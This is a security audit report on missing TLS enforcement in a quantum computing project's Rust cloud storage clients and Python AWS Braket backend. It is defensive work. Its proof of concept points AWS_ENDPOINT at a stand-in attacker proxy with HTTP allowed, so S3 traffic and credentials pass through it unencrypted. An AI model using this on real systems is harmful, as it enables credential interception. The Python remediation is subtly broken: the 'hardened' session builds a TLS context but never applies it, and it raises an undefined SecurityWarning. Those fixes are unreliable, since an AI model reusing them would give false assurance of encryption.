**Key Findings:**

The audit reveals that **no explicit TLS version enforcement exists** in any code path making external HTTPS connections. Both the Rust cloud storage clients and the Python AWS Braket SDK delegate TLS configuration entirely to library and system defaults without verifying or constraining protocol versions. ## Findings

### HIGH Severity

#### ASVS-1211-HIGH-001: HTTP Downgrade Possible via Environment Variables for S3 and GCS Clients

**Severity:** HIGH  
**Gap Type:** Type A — Entry point with NO control

**Location:**
- **File:** `qdp/qdp-core/src/remote.rs`
- **Function:** `build_store()` (lines 63–98)
- **Related Functions:** `resolve_path()`, `download_to_tempfile()`

**Description:**

The `build_store()` function creates cloud storage clients using builders that read all configuration from environment variables via `from_env()`. This includes security-sensitive variables like `AWS_ALLOW_HTTP` and `AWS_ENDPOINT` for S3, and `GOOGLE_ALLOW_HTTP` for GCS. No application-level override forces HTTPS-only connections, allowing complete TLS bypass if these environment variables are set.

**Vulnerable Code:**

```rust
fn build_store(scheme: &str, bucket: &str) -> Result<Arc<dyn ObjectStore>> {
    match scheme {
        "s3" => {
            let store = object_store::aws::AmazonS3Builder::from_env()
                .with_bucket_name(bucket)
                .build()
                // ...
        }
        "gs" => {
            let store = object_store::gcp::GoogleCloudStorageBuilder::from_env()
                .with_bucket_name(bucket)
                .build()
                // ...
        }
    }
}
```

**Data Flow:**

1. `resolve_path(url)` → `download_to_tempfile(url)` → `build_store(scheme, bucket)`
2. `AmazonS3Builder::from_env()` reads **all** supported environment variables, including `AWS_ALLOW_HTTP` and `AWS_ENDPOINT`
3. `GoogleCloudStorageBuilder::from_env()` reads `GOOGLE_ALLOW_HTTP` and custom endpoint variables
4. No subsequent call to `.with_allow_http(false)` overrides these settings
5. If `AWS_ALLOW_HTTP=true` and `AWS_ENDPOINT=http://...` are set, all S3 traffic is unencrypted

**Proof of Concept:**

```bash
# Environment bleed from testing to production (demonstrated in test comments at line ~212):
export AWS_ALLOW_HTTP=true
export AWS_ENDPOINT=http://proxy.attacker.example:9000
# Now all S3 downloads via resolve_path("s3://bucket/key") use HTTP
# Quantum circuit data, model parameters traversing untrusted networks in plaintext
```

The test documentation at lines 212–222 explicitly demonstrates this pattern:
```
# AWS_ENDPOINT=http://localhost:9123 AWS_ALLOW_HTTP=true \
# cargo test -p qdp-core --features remote-io -- test_download_from_minio
```

**Impact:**

- Complete loss of transport encryption for cloud storage traffic
- Quantum circuit intellectual property and scientific data exposed in transit
- AWS credentials (SigV4 signatures) transmitted over unencrypted connections
- ASVS 12.1.1 requires TLS 1.2+; HTTP is a total bypass

**Remediation:**

```rust
fn build_store(scheme: &str, bucket: &str) -> Result<Arc<dyn ObjectStore>> {
    match scheme {
        "s3" => {
            let store = object_store::aws::AmazonS3Builder::from_env()
                .with_bucket_name(bucket)
                .with_allow_http(false) // Explicitly enforce HTTPS
                .build()
                .map_err(|e| {
                    MahoutError::Io(format!(
                        "Failed to build S3 client for bucket '{}': {}",
                        bucket, e
                    ))
                })?;
            Ok(Arc::new(store))
        }
        "gs" => {
            let store = object_store::gcp::GoogleCloudStorageBuilder::from_env()
                .with_bucket_name(bucket)
                .with_allow_http(false) // Explicitly enforce HTTPS
                .build()
                .map_err(|e| {
                    MahoutError::Io(format!(
                        "Failed to build GCS client for bucket '{}': {}",
                        bucket, e
                    ))
                })?;
            Ok(Arc::new(store))
        }
        _ => { /* ... */ }
    }
}
```

### MEDIUM Severity

#### ASVS-1211-MEDIUM-002: No Explicit TLS Version Enforcement for Cloud Storage Connections (Rust)

**Severity:** MEDIUM  
**Gap Type:** Type A — Entry point with NO control

**Location:**
- **File:** `qdp/qdp-core/src/remote.rs`
- **Function:** `build_store()` (lines 63–98)
- **Related Functions:** `resolve_path()`, `download_to_tempfile()`

**Description:**

The cloud storage client builders create internal `reqwest::Client` instances for HTTPS requests without configuring minimum TLS version requirements. TLS version negotiation depends entirely on compile-time feature flags (`rustls` vs `native-tls`) and system OpenSSL configuration, with no application-level verification or constraint.

**Vulnerable Code:**

```rust
let store = object_store::aws::AmazonS3Builder::from_env()
    .with_bucket_name(bucket)
    .build()
```

```rust
let store = object_store::gcp::GoogleCloudStorageBuilder::from_env()
    .with_bucket_name(bucket)
    .build()
```

**Data Flow:**

1. `build_store()` creates cloud storage clients via builder pattern
2. Builders create an internal `reqwest::Client` for HTTPS requests
3. No `reqwest::ClientBuilder::min_tls_version(tls::Version::TLS_1_2)` is configured
4. TLS version negotiation depends entirely on compile-time feature flags (`rustls` vs `native-tls`) and system OpenSSL configuration
5. If compiled with `native-tls` on a system with permissive OpenSSL config, TLS 1.0/1.1 could be negotiated

**Impact:**

- On systems with older OpenSSL configurations or when compiled with `native-tls`, TLS 1.0 or 1.1 may be negotiated with cloud endpoints
- Known vulnerabilities in TLS 1.0 (BEAST, POODLE) and TLS 1.1 could be exploitable
- ASVS 12.1.1 requires explicit verification that only TLS 1.2 and 1.3 are enabled
- No guarantee TLS 1.3 is preferred as required

**Remediation:**

The `object_store` crate's builders do not directly expose TLS version settings. Enforce TLS version through:

**Option A: Cargo feature flag enforcement** (compile-time)
```toml
# Cargo.toml - Force rustls which only supports TLS 1.2+
[dependencies]
object_store = { version = "...", features = ["aws", "gcp"], default-features = false }
reqwest = { version = "...", features = ["rustls-tls"], default-features = false }
```

**Option B: Custom HTTP client with TLS pinning** (runtime)
```rust
use reqwest::tls::Version;

fn build_https_client() -> reqwest::Client {
    reqwest::Client::builder()
        .min_tls_version(Version::TLS_1_2)
        .build()
        .expect("Failed to build HTTPS client")
}

// Use with_client() if supported by the builder, or configure via
// the object_store ClientOptions
```

**Option C: Document and verify TLS backend**
```rust
// At application startup, verify TLS configuration
fn verify_tls_configuration() {
    // Log the TLS backend in use
    #[cfg(feature = "rustls")]
    log::info!("TLS backend: rustls (TLS 1.2+ only)");
    
    #[cfg(not(feature = "rustls"))]
    log::warn!("TLS backend: native-tls - verify system TLS configuration");
}
```

#### ASVS-1211-MEDIUM-003: No Explicit TLS Version Enforcement for AWS Braket Connections (Python)

**Severity:** MEDIUM  
**Gap Type:** Type A — Entry point with NO control

**Location:**
- **File:** `qumat/amazon_braket_backend.py`
- **Function:** `initialize_backend()` (lines 30–51)
- **Related Functions:** `execute_circuit()` (line 143), `get_final_state_vector()` (line 163)

**Description:**

The `initialize_backend()` function creates boto3 sessions without configuring TLS version requirements. The session relies on Python's default SSL context, which varies by Python version and system OpenSSL configuration. No explicit enforcement of TLS 1.2+ minimum exists.

**Vulnerable Code:**

```python
def initialize_backend(backend_config: Mapping[str, Any]) -> BraketBackend:
    backend_options = backend_config["backend_options"]
    region = backend_options.get("region")

    aws_session = None
    if region:
        boto_session = boto3.Session(region_name=region)
        aws_session = AwsSession(boto_session=boto_session)

    # ...
    return AwsDevice(
        "arn:aws:braket:::device/quantum-simulator/amazon/sv1",
        aws_session=aws_session,
    )
```

**Data Flow:**

1. `initialize_backend()` creates `boto3.Session()` without TLS configuration
2. `boto3` uses `botocore` → `urllib3` → Python `ssl` module
3. Python's `ssl.SSLContext` defaults depend on the Python version and system OpenSSL
4. No `ssl.PROTOCOL_TLSv1_2` or `ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1` is set
5. On older Python/OpenSSL, TLS 1.0/1.1 may be negotiated with AWS endpoints
6. `execute_circuit()` (line 143) and `get_final_state_vector()` (line 163) both use this session for AWS API calls containing quantum circuit data

**Impact:**

- Quantum circuit definitions (intellectual property) transmitted to AWS Braket without guaranteed TLS 1.2+ encryption
- AWS API credentials (SigV4) could be exposed if TLS 1.0 downgrade attack succeeds
- ASVS 12.1.1 requires explicit enforcement, not reliance on defaults

**Remediation:**

```python
import ssl
import urllib3
import boto3
from botocore.config import Config

def _create_hardened_boto_session(region: str | None = None) -> boto3.Session:
    """Create a boto3 session with enforced TLS 1.2+ minimum."""
    session = boto3.Session(region_name=region)
    
    # Verify the SSL context enforces TLS 1.2+
    # botocore respects the system SSL context, but we can verify
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    ctx.maximum_version = ssl.TLSVersion.TLSv1_3
    
    # Apply via botocore config
    # Note: botocore doesn't expose direct SSL context, so use urllib3 adapter
    return session

def initialize_backend(backend_config: Mapping[str, Any]) -> BraketBackend:
    backend_options = backend_config["backend_options"]
    region = backend_options.get("region")
    
    aws_session = None
    if region:
        boto_session = _create_hardened_boto_session(region)
        aws_session = AwsSession(boto_session=boto_session)
    else:
        boto_session = _create_hardened_boto_session()
        aws_session = AwsSession(boto_session=boto_session)
    
    # ... rest of function
```

Alternatively, enforce at the environment/deployment level:
```python
# At module load time, verify TLS configuration
import ssl
_ctx = ssl.create_default_context()
if _ctx.minimum_version < ssl.TLSVersion.TLSv1_2:
    import warnings
    warnings.warn(
        "System SSL does not enforce TLS 1.2 minimum. "
        "Update OpenSSL or set ssl.SSLContext.minimum_version.",
        SecurityWarning,
        stacklevel=1,
    )
```

## Architecture Observations

1. **TLS Delegation Pattern**: Both Rust and Python components fully delegate TLS configuration to underlying libraries (`object_store`/`reqwest` for Rust, `boto3`/`botocore`/`urllib3` for Python). While this simplifies development, it means the application has **zero visibility or control** over the actual TLS version negotiated.

2. **Environment-Driven Configuration Risk**: The `from_env()` pattern in the `object_store` crate is convenient but security-hazardous — it ingests all environment variables including ones that disable security controls (`AWS_ALLOW_HTTP`). There is no application-level override to re-enforce security constraints.

3. **In-Process FFI Communication**: Python-to-Rust communication occurs via FFI (PyO3), not over the network. This is a positive architectural decision that eliminates an entire class of TLS-related attack surface for internal communication.

4. **No TLS Monitoring**: There is no logging, metrics, or runtime verification of the TLS version actually negotiated for cloud connections. This makes it impossible to detect TLS downgrade even if it occurs.

## Recommendations Summary

### Immediate Actions (P0)

- **Add `.with_allow_http(false)` to both `AmazonS3Builder` and `GoogleCloudStorageBuilder`** in `build_store()` function
  - **Effort:** Low (2 lines of code)
  - **Addresses:** ASVS-1211-HIGH-001
  - **Impact:** Prevents complete TLS bypass via environment variables

### Short-term Actions (P1-P2)

- **Pin `object_store` dependency to use `rustls` TLS backend** via Cargo features to ensure TLS 1.2+ only
  - **Effort:** Low
  - **Addresses:** ASVS-1211-MEDIUM-002

- **Add startup TLS configuration verification** in both Rust and Python entry points
  - **Effort:** Medium
  - **Addresses:** ASVS-1211-MEDIUM-002, ASVS-1211-MEDIUM-003

### Long-term Actions (P3-P5)

- **Add SSL context hardening for boto3 sessions** with `minimum_version = TLSv1_2`
  - **Effort:** Medium
  - **Addresses:** ASVS-1211-MEDIUM-003

- **Document TLS requirements and supported versions** in project security documentation
  - **Effort:** Low
  - **Addresses:** All findings

- **Add integration tests** that verify TLS version in cloud connections
  - **Effort:** Medium
  - **Addresses:** All findings
